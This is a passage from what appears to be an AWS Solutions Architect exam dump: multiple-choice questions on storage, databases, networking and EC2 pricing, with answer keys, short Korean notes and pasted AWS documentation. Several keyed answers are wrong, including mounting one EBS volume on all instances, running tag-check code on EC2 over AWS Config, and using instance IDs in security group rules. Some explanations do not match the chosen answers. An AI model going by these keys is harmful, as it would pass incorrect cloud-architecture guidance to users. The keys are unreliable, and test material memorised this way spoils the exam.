data from on-premises to the AWS Cloud The company uses tiered storage on premises with hot highperformance parallel storage to support the application during periodic runs of the application and more economical cold storage to hold the data when the application is not actively running Which combination of solutions should a solutions architect recommend to support the storage needs of the application? (Select TWO )\nA. Amazon S3 for cold data storage B. Amazon EFS for cold data storage C. Amazon S3 for high-performance parallel storage D. Amazon FSx for Lustre for high-performance parallel storage E. Amazon FSx for Windows for high-performance parallel storage \r문제 풀이\r...\r\rAnswer: A D \r\r\r   QUESTION A company is planning to deploy an Amazon RDS DB instance running Amazon Aurora The company has a backup retention policy requirement of 90 days Which solution should a solutions architect recommend?\nA. Set the backup retention period to 90 days when creating the RDS DB instance\nB. Configure RDS to copy automated snapshots to a user-managed Amazon S3 bucket with a lifecycle policy set to delete after 90 days.\nC. Create an AWS Backup plan to perform a daily snapshot of the RDS database with the retention set to 90 days Create an AWS Backup job to schedule the execution of the backup plan daily\nD. Use a daily scheduled event with Amazon CloudWatch Events to execute a custom AWS Lambda function that makes a copy of the RDS automated snapshot Purge snapshots older than 90 days \r문제 풀이\r...\r\rAnswer: C  백업 보존 기간은 0- 35일 입니다. 사용자 정의 S3 버킷에서 RDS 백업이 발생하지 않습니다.  \r\r\r   QUESTION A company that hosts its web application on AWS wants to ensure all Amazon EC2 instances. Amazon RDS DB instances and Amazon Redshift clusters are configured with tags. The company wants to minimize the effort of configuring and operating this check.\nWhat should a solutions architect do to accomplish this?\nA. Use AWS Config rules to define and detect resources that are not property tagged\nB. Use Cost Explorer to display resources that are not properly tagged Tag those resources manually.\nC. Write API calls to check all resources for proper tag allocation. Periodically run the code on an EC2 instance.\nD. Write API calls to check all resources for proper tag allocation. Schedule an AWS Lambda function through Amazon CloudWatch to periodically run the code \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs multiple Amazon EC2 Linux instances in a VPC with applications that use a hierarchical directory structure. The applications need to rapidly and concurrently read and write to shared storage How can this be achieved?\nA. Create an Amazon EFS file system and mount it from each EC2 instance. B. Create an Amazon S3 bucket and permit access from all the EC2 instances in the VPC. C. Create a file system on an Amazon EBS Provisioned IOPS SSD (io1) volume. Attach the volume to all the EC2 instances. D. Create file systems on Amazon EBS volumes attached to each EC2 instance. Synchronize the Amazon EBS volumes across the different EC2 instances. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is creating an architecture for a mobile app that requires minimal latency for its users The company\u0026rsquo;s architecture consists of Amazon EC2 instances behind an Application Load Balancer running in an Auto Scaling group The EC2 instances connect to Amazon RDS. Application beta testing showed there was a slowdown when reading the data However the metrics indicate that the EC2 instances do not cross any CPU utilization thresholds How can this issue be addressed?\nA. Reduce the threshold for CPU utilization in the Auto Scaling group B. Replace the Application Load Balancer with a Network Load Balancer. C. Add read replicas for the RDS instances and direct read traffic to the replica. D. Add Multi-AZ support to the RDS instances and direct read traffic to the new EC2 instance. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has an application hosted on Amazon EC2 instances in two VPCs across different AWS Regions To communicate with each other, the instances use the internet for connectivity. The security team wants to ensure that no communication between the instances happens over the internet What should a solutions architect do to accomplish this?\nA. Create a NAT gateway and update the route table of the EC2 instances' subnet\nB. Create a VPC endpoint and update the route table of the EC2 instances' subnet\nC. Create a VPN connection and update the route table of the EC2 instances' subnet\nD. Create a VPC peering connection and update the route table of the EC2 instances' subnet \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has an on-premises MySQL database used by the global sales team with infrequent access patterns. The sales team requires the database to have minimal downtime. A database administrator wants to migrate this database to AWS without selecting a particular instance type in anticipation of more users in the future. Which service should a solution architect recommend?\nA. Amazon Aurora MySQL B. Amazon Aurora Serverless for MySQL C. Amazon Redshift Spectrum D. Amazon RDS for MySQL \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has migrated an on-premises Oracle database to an Amazon RDS (or Oracle Multi-AZ DB instance In the us-east-l Region. A solutions architect is designing a disaster recovery strategy to have the database provisioned In the us-west-2 Region In case the database becomes unavailable in the us-east-1 Region. The design must ensure the database is provisioned in the uswest-2 Region in a maximum of 2 hours, with a data loss window of no more than 3 hours. How can these requirements be met?\nA. Edit the DB instance and create a read replica in us-west-2. Promote the read replica to master In us-west-2 in case the disaster recovery environment needs to be activated. B. Select the multi-Region option to provision a standby instance in us-west-2. The standby Instance will be automatically promoted to master In us-west-2 in case the disaster recovery environment needs to be created. C. Take automated snapshots of the database instance and copy them to us-west-2 every 3 hours. Restore the latest snapshot to provision another database instance in us-west-2 in case the disaster recovery environment needs to be activated. D. Create a multimaster read/write instances across multiple AWS Regions Select VPCs in us-east-1 and us-west-2 lo make that deployment. Keep the master read/write instance in us-west-2 available to avoid having to activate a disaster recovery environment. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company must generate sales reports at the beginning of every month. The reporting process launches 20 Amazon EC2 instances on the first of the month. The process runs for 7 days and cannot be interrupted. The company wants to minimize costs. Which pricing model should the company choose?\nA. Reserved Instances\nB. Spot Block Instances\nC. On-Demand Instances\nD. Scheduled Reserved Instances \r문제 풀이\r...\r\rAnswer: D Explanation Scheduled Reserved Instances Scheduled Reserved Instances (Scheduled Instances) enable you to purchase capacity reservations that recur on a daily, weekly, or monthly basis, with a specified start time and duration, for a oneyear term. You reserve the capacity in advance, so that you know it is available when you need it. You pay for the time that the instances are scheduled, even if you do not use them. Scheduled Instances are a good choice for workloads that do not run continuously, but do run on a regular schedule. For example, you can use Scheduled Instances for an application that runs during business hours or for batch processing that runs at the end of the week. If you require a capacity reservation on a continuous basis, Reserved Instances might meet your needs and decrease costs. How Scheduled Instances Work Amazon EC2 sets aside pools of EC2 instances in each Availability Zone for use as Scheduled Instances. Each pool supports a specific combination of instance type, operating system, and network. To get started, you must search for an available schedule. You can search across multiple pools or a single pool. After you locate a suitable schedule, purchase it. You must launch your Scheduled Instances during their scheduled time periods, using a launch configuration that matches the following attributes of the schedule that you purchased: instance type, Availability Zone, network, and platform. When you do so, Amazon EC2 launches EC2 instances on your behalf, based on the specified launch specification. Amazon EC2 must ensure that the EC2 instances have terminated by the end of the current scheduled time period so that the capacity is available for any other Scheduled Instances it is reserved for. Therefore, Amazon EC2 terminates the EC2 instances three minutes before the end of the current scheduled time period. You can\u0026rsquo;t stop or reboot Scheduled Instances, but you can terminate them manually as needed. If you terminate a Scheduled Instance before its current scheduled time period ends, you can launch it again after a few minutes. Otherwise, you must wait until the next scheduled time period. The following diagram illustrates the lifecycle of a Scheduled Instance. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-scheduled-instances.html\r\r\r\r   QUESTION A company is looking for a solution that can store video archives in AWS from old news footage. The company needs to minimize costs and will rarely need to restore these files. When the files are needed, they must be available in a maximum of five minutes. What is the MOST cost-effective solution?\nA. Store the video archives in Amazon S3 Glacier and use Expedited retrievals.\nB. Store the video archives in Amazon S3 Glacier and use Standard retrievals.\nC. Store the video archives in Amazon S3 Standard-Infrequent Access (S3 Standard-IA).\nD. Store the video archives in Amazon S3 One Zone-Infrequent Access (S3 One Zone-IA). \r문제 풀이\r...\r\rAnswer: A  신속 검색을 사용해야 5분 이내에 검색이 가능합니다.  \r\r\r   QUESTION A company is designing a new service that will run on Amazon EC2 instance behind an Elastic Load Balancer. However, many of the web service clients can only reach IP addresses whitelisted on their firewalls. What should a solution architect recommend to meet the clients' needs?\nA. A Network Load Balancer with an associated Elastic IP address.\nB. An Application Load Balancer with an a associated Elastic IP address\nC. An A record in an Amazon Route 53 hosted zone pointing to an Elastic IP address\nD. An EC2 instance with a public IP address running as a proxy in front of the load balancer \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a custom application with embedded credentials that retrieves information from an Amazon RDS MySQL DB instance. Management says the application must be made more secure with the least amount of programming effort. What should a solutions architect do to meet these requirements?\nA. Use AWS Key Management Service (AWS KMS) customer master keys (CMKs) to create keys. Configure the application to load the database credentials from AWS KMS Enable automatic key rotation. B. Create credentials on the RDS for MySQL database for the application user and store the credentials in AWS Secrets Manager. Configure the application to load the database credentials from Secrets Manager. Create an AWS Lambda function that rotates the credentials in Secret Manager. C. Create credentials on the RDS for MySQL database for the application user and store the credentials in AWS Secrets Manager. Configure the application to load the database credentials from Secrets Manager. Set up a credentials rotation schedule for the application user in the RDS for MySQL database using Secrets Manager. D. Create credentials on the RDS for MySQL database for the application user and store the credentials in AWS Systems Manager Parameter Store. Configure the application to load the database credentials from Parameter Store. Set up a credentials rotation schedule for the application user in the RDS for MySQL database using Parameter Store. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION An ecommerce company has noticed performance degradation of its Amazon RDS based web application. The performance degradation is attribute to an increase in the number of read-only SQL queries triggered by business analysts. A solution architect needs to solve the problem with minimal changes to the existing web application. What should the solution architect recommend?\nA. Export the data to Amazon DynamoDB and have the business analysts run their queries. B. Load the data into Amazon ElasticCache and have the business analysts run their queries. C. Create a read replica of the primary database and have the business analysts run their queries. D. Copy the data into an Amazon Redshift cluster and have the business analysts run their queries. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is running a media store across multiple Amazon EC2 instances distributed across multiple Availability Zones in a single VPC. The company wants a high-performing solution to share data between all the EC2 Instances, and prefers to keep the data within the VPC only. What should a solutions architect recommend?\nA. Create an Amazon S3 bucket and call the service APIs from each instance\u0026rsquo;s application. B. Create an Amazon S3 bucket and configure all instances to access it as a mounted volume. C. Configure an Amazon Elastic Block Store (Amazon EBS) volume and mount it across all instances. D. Configure an Amazon Elastic File System (Amazon EFS) file system and mount it across all instances \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is running a multi-tier web application on premises. The web application is containerized and runs on a number of Linux hosts connected to a PostgreSQL database that contains user records. The operational overhead of maintaining the infrastructure and capacity planning is limiting the company\u0026rsquo;s growth A solutions architect must improve the application\u0026rsquo;s infrastructure. Which combination of actions should the solutions architect take to accomplish this? (Select TWO.)\nA. Migrate the PostgreSQL database to Amazon Aurora\nB. Migrate the web application to be hosted on Amazon EC2 instances.\nC. Set up an Amazon CloudFront distribution for the web application content.\nD. Set up Amazon ElastiCache between the web application and the PostgreSQL database\nE. Migrate the web application to be hosted on AWS Fargate with Amazon Elastic Container Service (Amazon ECS) \r문제 풀이\r...\r\rAnswer: C D \r\r\r   QUESTION A company has copied 1 PB of data from a colocation facility to an Amazon S3 bucket in the us-east-1 Region using an AWS Direct Connect link. The company now wants to copy the data to another S3 bucket in the us-west-2 Region. The colocation facility does not allow the use AWS Snowball. What should a solutions architect recommend to accomplish this?\nA. Order a Snowball Edge device to copy the data from one Region to another Region.\nB. Transfer contents from the source S3 bucket to a target S3 bucket using the S3 console.\nC. Use the aws S3 sync command to copy data from the source bucket to the destination bucket.\nD. Add a cross-Region replication configuration to copy objects across S3 buckets in different Reg. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is designing an architecture for a new application that requires low network latency and high network throughput between Amazon EC2 instances. Which component should be included in the architectural design?\nA. An Auto Scaling group with Spot Instance types.\nB. A placement group using a cluster placement strategy.\nC. A placement group using a partition placement strategy.\nD. An Auto Scaling group with On-Demand instance types. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has a dynamic web application hosted on two Amazon EC2 instances. The company has its own SSL certificate, which is on each instance to perform SSL termination. There has been an increase in traffic recently, and the operations team determined that SSL encryption and decryption is causing the compute capacity of the web servers to reach their maximum limit. What should a solutions architect do to increase the application\u0026rsquo;s performance?\nA. Create a new SSL certificate using AWS Certificate Manager (ACM). Install the ACM certificate on each instance.\nB. Create an Amazon S3 bucket. Migrate the SSL certificate to the S3 bucket. Configure the EC2 instances to reference the bucket for SSL termination.\nC. Create another EC2 instance as a proxy server. Migrate the SSL certificate to the new instance and configure it to direct connections to the existing EC2 instances.\nD. Import the SSL certificate into AWS Certificate Manager (ACM). Create an Application Load Balancer with an HTTPS listener that uses the SSL certificate from ACM. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has on-premises servers running a relational database The current database serves high read traffic for users in different locations The company wants to migrate to AWS with the least amount of effort The database solution should support disaster recovery and not affect the company\u0026rsquo;s current traffic flow. Which solution meets these requirements?\nA. Use a database in Amazon RDS with Multi-AZ and at least one read replica\nB. Use a database in Amazon RDS with Multi-AZ and at least one standby replica\nC. Use databases hosted on multiple Amazon EC2 instances in different AWS Regions\nD. Use databases hosted on Amazon EC2 instances behind an Application Load Balancer in different Availability Zones \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company\u0026rsquo;s production application runs online transaction processing (OLTP) transactions on an Amazon RDS MySQL DB instance The company is launching a new reporting tool that will access the same data The reporting tool must be highly available and not impact the performance of the production application. How can this be achieved?\nA. Create hourly snapshots of the production RDS DB instance\nB. Create a Multi-AZ RDS Read Replica of the production RDS DB instance\nC. Create multiple RDS Read Replicas of the production RDS DB instance Place the Read Replicas in an Auto Scaling group\nD. Create a Single-AZ RDS Read Replica of the production RDS DB instance Create a second Single-AZ RDS Read Replica from the replica \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company hosts its static website content from an Amazon S3 bucket in the us-east-1 Region. Content is made available through an Amazon CloudFront origin pointing to that bucket Cross-Region replication is set up to create a second copy of the bucket in the ap-southeast-1 Region. Management wants a solution that provides greater availability for the website. Which combination of actions should a solutions architect take to increase availability? (Select TWO.)\nA. Add both buckets to the CloudFront origin\nB. Configure failover routing in Amazon Route 53\nC. Create a record in Amazon Route 53 pointing to the replica bucket\nD. Create an additional CloudFront origin pointing to the ap-southeast-1 bucket\nE. Set up a CloudFront origin group with the us-east-1 bucket as the primary and the ap-southeast-1 bucket as the secondary \r문제 풀이\r...\r\rAnswer: D E \r\r\r   QUESTION A solutions architect is designing a web application that will run on Amazon EC2 instances behind an Application Load Balancer (ALB) The company strictly requires that the application be resilient against malicious internet activity and attacks, and protect against new common vulnerabilities and exposures What should the solutions architect recommend?\nA. Leverage Amazon CloudFront with the ALB endpoint as the origin\nB. Deploy an appropriate managed rule for AWS WAF and associate it with the ALB\nC. Subscribe to AWS Shield Advanced and ensure common vulnerabilities and exposures are blocked\nD. Configure network ACLs and security groups to allow only ports 80 and 443 to access the EC2 instances \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company captures clickstream data from multiple websites and analyzes it using batch processing. The data is loaded nightly into Amazon Redshift and is consumed by business analysts. The company wants to move towards near-real-time data processing for timely insights. The solution should process the streaming data with minimal effort and operational overhead. Which combination of AWS services are MOST cost-effective for this solution? (Choose two.)\nA. Amazon EC2\nB. AWS Lambda\nC. Amazon Kinesis Data Streams\nD. Amazon Kinesis Data Firehose\nE. Amazon Kinesis Data Analytics \r문제 풀이\r...\r\rAnswer: D E Explanation Kinesis Data Streams and Kinesis Client Library (KCL) - Data from the data source can be continuously captured and streamed in near real-time using Kinesis Data Streams. With the Kinesis Client Library (KCL), you can build your own application that can preprocess the streaming data as they arrive and emit the data for generating incremental views and downstream analysis. Kinesis Data Analytics - This service provides the easiest way to process the data that is streaming through Kinesis Data Stream or Kinesis Data Firehose using SQL. This enables customers to gain actionable insight in near real-time from the incremental stream before storing it in Amazon S3.\nhttps://d1.awsstatic.com/whitepapers/lambda-architecure-on-for-batch-aws.pdf\n\r\r\r   QUESTION A company has media and application files that need to be shared internally. Users currently are authenticated using Active Directory and access files from a Microsoft Windows platform. The chief execute officer wants to keep the same user permissions, but wants the company to improve the process as the company is reaching its storage capacity limit. What should a solutions architect recommend?\nA. Set up a corporate Amazon S3 bucket and move and media and application files.\nB. Configure Amazon FSx for Windows File Server and move all the media and application files.\nC. Configure Amazon Elastic File System (Amazon EFS) and move all media and application files.\nD. Set up Amazon EC2 on Windows, attach multiple Amazon Elastic Block Store (Amazon EBS) volumes and, and move all media and application files. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company\u0026rsquo;s packaged application dynamically creates and returns single-use text files in response to user requests. The company is using Amazon CloudFront for distribution, but wants to future reduce data transfer costs. The company modify the application\u0026rsquo;s source code. What should a solution architect do to reduce costs?\nA. Use Lambda adage to compress the files as they are sent to users.\nB. Enable Amazon S3 Transfer Acceleration to reduce the response times.\nC. Enable caching on the CloudFront distribution to store generated files at the edge.\nD. Use Amazon S3 multipart uploads to move the files to Amazon S3 before returning them to users. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has 150 TB of archived image data stored on-premises that needs to be mowed to the AWS Cloud within the next month. The company\u0026rsquo;s current network connection allows up to 100 Mbps uploads for this purpose during the night only. What is the MOST cost-effective mechanism to move this data and meet the migration deadline?\nA. Use AWS Snowmobile to ship the data to AWS.\nB. Order multiple AWS Snowball devices to ship the data to AWS.\nC. Enable Amazon S3 Transfer Acceleration and securely upload the data.\nD. Create an Amazon S3 VPC endpoint and establish a VPN to upload the data. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is migrating to the AWS Cloud. A file server is the first workload to migrate. Users must be able to access the file share using the Server Message Block (SMB) protocol. Which AWS managed service meets these requirements?\nA. Amazon EBS\nB. Amazon EC2\nC. Amazon FSx\nD. Amazon S3 \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solutions architect is using Amazon S3 to design the storage architecture of a new digital media application. The media files must be resilient to the loss of an Availability Zone Some files are accessed frequently while other files are rarely accessed in an unpredictable pattern. The solutions architect must minimize the costs of storing and retrieving the media files. Which storage option meets these requirements?\nA. S3 Standard\nB. S3 Intelligent-Tiering\nC. S3 Standard-Infrequent Access {S3 Standard-IA)\nD. S3 One Zone-Infrequent Access (S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has application running on Amazon EC2 instances in a VPC. One of the applications needs to call an Amazon S3 API to store and read objects. The company\u0026rsquo;s security policies restrict any internet-bound traffic from the applications. Which action will fulfill these requirements and maintain security?\nA. Configure an S3 interface endpoint.\nB. Configure an S3 gateway endpoint.\nC. Create an S3 bucket in a private subnet.\nD. Create an S3 bucket in the same Region as the EC2 instance. \r문제 풀이\r...\r\rAnswer: B Explanation VPC endpoints A VPC endpoint enables you to privately connect your VPC to supported AWS services and VPC endpoint services powered by AWS PrivateLink without requiring an internet gateway, NAT device, VPN connection, or AWS Direct Connect connection. Instances in your VPC do not require public IP addresses to communicate with resources in the service. Traffic between your VPC and the other service does not leave the Amazon network. An interface endpoint is an elastic network interface with a private IP address from the IP address range of your subnet that serves as an entry point for traffic destined to a supported service. Interface endpoints are powered by AWS PrivateLink, a technology that enables you to privately access services by using private IP addresses. AWS PrivateLink restricts all network traffic between your VPC and services to the Amazon network. You do not need an internet gateway, a NAT device, or a virtual private gateway. https://docs.aws.amazon.com/vpc/latest/userguide/vpc-endpoints.html\r\r\r\r   QUESTION A company is planning to build a new web application on AWS. The company expects predictable traffic most of the year and very high traffic on occasion. The web application needs to be highly available and fault tolerant with minimal latency. What should a solutions architect recommend to meet these requirements?\nA. Use an Amazon Route 53 routing policy to distribute requests to two AWS Regions, each with one Amazon EC2 instance.\nB. Use Amazon EC2 instances in an Auto Scaling group with an Application Load Balancer across multiple Availability Zones.\nC. Use Amazon EC2 instances in a cluster placement group with an Application Load Balancer across multiple Availability Zones.\nD. Use Amazon EC2 instances in a cluster placement group and include the cluster placement group within a new Auto Scaling group. \r문제 풀이\r...\r\rAnswer: B  클러스터는 다중 AZ를 지원하지 않습니다.  \r\r\r   QUESTION A company has created an isolated backup of its environment in another Region. The application is running in warm standby mode and is fronted by an Application Load Balancer (ALB). The current failover process is manual and requires updating a DNS alias record to point to the secondary ALB in another Region. What should a solution architect do to automate the failover process?\nA. Enable an ALB health check\nB. Enable an Amazon Route 53 health check.\nC. Crate an CNAME record on Amazon Route 53 pointing to the ALB endpoint.\nD. Create conditional forwarding rules on Amazon Route 53 pointing to an internal BIND DNS server. \r문제 풀이\r...\r\rAnswer: B  ALB는 다른 지역에서 확장 할 수 없습니다.  \r\r\r   QUESTION A solutions architect is deploying a distributed database on multiple Amazon EC2 instances The database stores all data on multiple instances so it can withstand the loss of an instance The database requires block storage with latency and throughput to support several million transactions per second per server Which storage solution should the solutions architect use?\nA. Amazon EBS\nB. Amazon EC2 instance store\nC. Amazon EFS\nD. Amazon S3 \r문제 풀이\r...\r\rAnswer: B Explanation https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/InstanceStorage.html\r\r\r\r   QUESTION A solutions architect is designing a VPC with public and private subnets. The VPC and subnets use IPv4 CIDR blocks. There is one public subnet and one private subnet in each of three Availability Zones (AZs) for high availability. An interne! gateway is used to provide internet access for the public subnets. The private subnets require access to the internet to allow Amazon EC2 instances to download software updates. What should the solutions architect do to enable internet access for the private subnets?\nA. Create three NAT gateways, one for each public subnet in each AZ. Create a private route table for each AZ that forwards non-VPC traffic to the NAT gateway in its AZ B. Create three NAT instances, one for each private subnet in each AZ. Create a private route table for each AZ that forwards non-VPC traffic to the NAT instance in its AZ C. Create a second internet gateway on one of the private subnets. Update the route table for the private subnets that forward non-VPC traffic to the private internet gateway D. Create an egress only internet gateway on one of the public subnets. Update the route table for the private subnets that forward non-VPC traffic to the egress only internet gateway \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing a new service behind Amazon API Gateway The request patterns for the service will be unpredictable and can change suddenly from 0 requests to over 500 per second The total size of the data that needs to be persisted in a backend database is currently less than 1 GB with unpredictable future growth Data can be queried using simple key-value requests Which combination of AWS services would meet these requirements? (Select TWO )\nA. AWS Fargate B. AWS Lambda C. Amazon DynamoDB D. Amazon EC2 Auto Scaling E. MySQL-compatible Amazon Aurora \r문제 풀이\r...\r\rAnswer: B C Explanation https://aws.amazon.com/about-aws/whats-new/2017/11/amazon-api-gateway-supports-endpointintegrations-wit\r\r\r\r   QUESTION An ecommerce company is running a multi-tier application on AWS. The front-end and backend tiers both run on Amazon EC2. and the database runs on Amazon RDS for MySQL. The backend tier communicates with the RDS instance. There are frequent calls to return identical datasets from the database that are causing performance slowdowns. Which action should be taken to improve the performance of the backend?\nA. Implement Amazon SNS to store the database calls. B. Implement Amazon ElastiCache to cache the large datasets. C. Implement an RDS for MySQL read replica to cache database calls. D. Implement Amazon Kinesis Data Firehose to stream the calls to the database. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect has created a new AWS account and must secure AWS account root user access Which combination of actions will accomplish this? (Select TWO.)\nA. Ensure the root user uses a strong password\nB. Enable multi-factor authentication to the root user\nC. Store root user access keys in an encrypted Amazon S3 bucket\nD. Add the root user to a group containing administrative permissions.\nE. Apply the required permissions to the root user with an inline policy document \r문제 풀이\r...\r\rAnswer: A B \r\r\r   QUESTION An ecommerce website is deploying its web application as Amazon Elastic Container Service (Amazon ECS) container instances behind an Application Load Balancer (ALB). During periods of high activity, the website slows down and availability is reduced. A solutions architect uses Amazon CloudWatch alarms to receive notifications whenever there is an availability issue so they can scale out resources. Company management wants a solution that automatically responds to such events. Which solution meets these requirements?\nA. Set up AWS Auto Scaling to scale out the ECS service when there are timeouts on the ALB Set up AWS Auto Scaling to scale out the ECS cluster when the CPU or memory reservation is too high.\nB. Set up AWS Auto Scaling to scale out the ECS service when the ALB CPU utilization is too high. Set up AWS Auto Scaling to scale out the ECS cluster when the CPU or memory reservation is too high.\nC. Sot up AWS Auto Scaling to scale out the ECS service when the service\u0026rsquo;s CPU utilization is too high. Set up AWS Auto Scaling to scale out the ECS cluster when the CPU or memory reservation is too high.\nD. Set up AWS Auto Scaling to scale out the ECS service when the ALB target group CPU utilization is too high. Set up AWS Auto Scaling to scale out the ECS cluster when the CPU or memory reservation is too high. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a Microsoft Windows-based application that must be migrated to AWS. This application requires the use of a shared Windows file system attached to multiple Amazon EC2 Windows instances. What should a solution architect do to accomplish this?\nA. Configure a volume using Amazon EFS Mount the EPS volume to each Windows Instance\nB. Configure AWS Storage Gateway in Volume Gateway mode Mount the volume to each Windows instance\nC. Configure Amazon FSx for Windows File Server Mount the Amazon FSx volume to each Windows Instance\nD. Configure an Amazon EBS volume with the required size Attach each EC2 instance to the volume Mount the file system within the volume to each Windows instance \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A recently created startup built a three-tier web application. The front end has static content. The application layer is based on microservices. User data is stored as JSON documents that need to be accessed with low latency. The company expects regular traffic to be low during the first year, with peaks in traffic when it publicizes new features every month. The startup team needs to minimize operational overhead costs. What should a solutions architect recommend to accomplish this?\nA. Use Amazon S3 static website hosting to store and serve the front end Use AWS Elastic Beanstalk for the application layer. Use Amazon DynamoDB to store user data. B. Use Amazon S3 static website hosting to store and serve the front end. Use Amazon Elastic Kubernetes Service (Amazon EKS) for the application layer. Use Amazon DynamoDB to store user data. C. Use Amazon S3 static website hosting to store and serve the front end. Use Amazon API Gateway and AWS Lambda functions for the application layer Use Amazon DynamoDB to store user data. D. Use Amazon S3 static website hosting to store and serve the front end. Use Amazon API Gateway and AWS Lambda functions for the application layer. Use Amazon RDS with read replicas to store user data. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company must migrate 20 TB of data from a data center to the AWS Cloud within 30 days. The company\u0026rsquo;s network bandwidth is limited to 15 Mbps and cannot exceed 70% utilization. What should a solutions architect do to meet these requirements?\nA. Use AWS Snowball.\nB. Use AWS DataSync.\nC. Use a secure VPN connection.\nD. Use Amazon S3 Transfer Acceleration. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is managing health records on-premises. The company must keep these records indefinitely, disable any modifications to the records once they are stored, and granularly audit access at all levels. The chief technology officer (CTO) is concerned because there are already millions of records not being used by any application, and the current infrastructure is running out of space The CTO has requested a solutions architect design a solution to move existing data and support future records Which services can the solutions architect recommend to meet these requirements'?\nA. Use AWS DataSync to move existing data to AWS. Use Amazon S3 to store existing and new data Enable Amazon S3 object lock and enable AWS CloudTrail with data events.\nB. Use AWS Storage Gateway to move existing data to AWS Use Amazon S3 to store existing and new data. Enable Amazon S3 object lock and enable AWS CloudTrail with management events.\nC. Use AWS DataSync to move existing data to AWS Use Amazon S3 to store existing and new data Enable Amazon S3 object lock and enable AWS CloudTrail with management events.\nD. Use AWS Storage Gateway to move existing data to AWS Use Amazon Elastic Block Store (Amazon EBS) to store existing and new data Enable Amazon S3 object lock and enable Amazon S3 server access logging \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect is designing a mission-critical web application. It will consist of Amazon EC2 instances behind an Application Load Balancer and a relational database. The database should be highly available and fault tolerant. Which database implementations will meet these requirements? (Select TWO.)\nA. Amazon Redshift B. Amazon DynamoDB C. Amazon RDS for MySQL D. MySQL-compatible Amazon Aurora Multi-AZ E. Amazon RDS for SQL Server Standard Edition Mufti-AZ \r문제 풀이\r...\r\rAnswer: D E \r\r\r   QUESTION A company is reviewing a recent migration of a three-tier application to a VPC. The security team discovers thai the principle of least privilege is not being applied to Amazon EC2 security group ingress and egress rules between the application tiers. What should a solutions architect do to correct this issue?\nA. Create security group rules using the instance ID as the source or destination.\nB. Create security group rules using the security group ID as the source or destination.\nC. Create security group rules using the VPC CIDR blocks as the source or destination.\nD. Create security group rules using the subnet CIDR blocks as the source or destination. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is running an ecommerce application on Amazon EC2 The application consists of a stateless web tier that requires a minimum of 10 instances, and a peak of 250 instances to support the application\u0026rsquo;s usage The application requires 50 instances 80% of the time Which solution should be used to minimize costs?\nA. Purchase Reserved Instances to cover 250 instances\nB. Purchase Reserved Instances to cover 80 instances Use Spot Instances to cover the remaining instances\nC. Purchase On-Demand Instances to cover 40 instances Use Spot Instances to cover the remaining instances\nD. Purchase Reserved Instances to cover 50 instances Use On-Demand and Spot Instances to cover the remaining instances \r문제 풀이\r...\r\rAnswer: D Explanation Reserved Instances Having 50 EC2 RIs provide a discounted hourly rate and an optional capacity reservation for EC2 instances. AWS Billing automatically applies your RI\u0026rsquo;s discounted rate when attributes of EC2 instance usage match attributes of an active RI. If an Availability Zone is specified, EC2 reserves capacity matching the attributes of the RI. The capacity reservation of an RI is automatically utilized by running instances matching these attributes. You can also choose to forego the capacity reservation and purchase an RI that is scoped to a region. RIs that are scoped to a region automatically apply the RI\u0026rsquo;s discount to instance usage across AZs and instance sizes in a region, making it easier for you to take advantage of the RI\u0026rsquo;s discounted rate. On-Demand Instance On-Demand instances let you pay for compute capacity by the hour or second (minimum of 60 seconds) with no long-term commitments. This frees you from the costs and complexities of planning, purchasing, and maintaining hardware and transforms what are commonly large fixed costs into much smaller variable costs. The pricing below includes the cost to run private and public AMIs on the specified operating system\n100 (\u0026ldquo;Windows Usage\u0026rdquo; prices apply to Windows Server 2003 R2, 2008, 2008 R2, 2012, 2012 R2, 2016, and 2019). Amazon also provides you with additional instances for Amazon EC2 running Microsoft Windows with SQL Server, Amazon EC2 running SUSE Linux Enterprise Server, Amazon EC2 running Red Hat Enterprise Linux and Amazon EC2 running IBM that are priced differently. Spot Instances A Spot Instance is an unused EC2 instance that is available for less than the On-Demand price. Because Spot Instances enable you to request unused EC2 instances at steep discounts, you can lower your Amazon EC2 costs significantly. The hourly price for a Spot Instance is called a Spot price. The Spot price of each instance type in each Availability Zone is set by Amazon EC2, and adjusted gradually based on the long-term supply of and demand for Spot Instances. Your Spot Instance runs whenever capacity is available and the maximum price per hour for your request exceeds the Spot price. https://aws.amazon.com/ec2/pricing/reserved-instances/ https://aws.amazon.com/ec2/pricing/on-demand/ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-spot-instances.html\n\r\r\r   QUESTION A solutions architect is optimizing a website for an upcoming musical event Videos of the performances will be streamed in real time and then will be available on demand The event is expected to attract a global online audience Which service will improve the performance of both the real-time and on-demand streaming?\nA. Amazon CloudFront\nB. 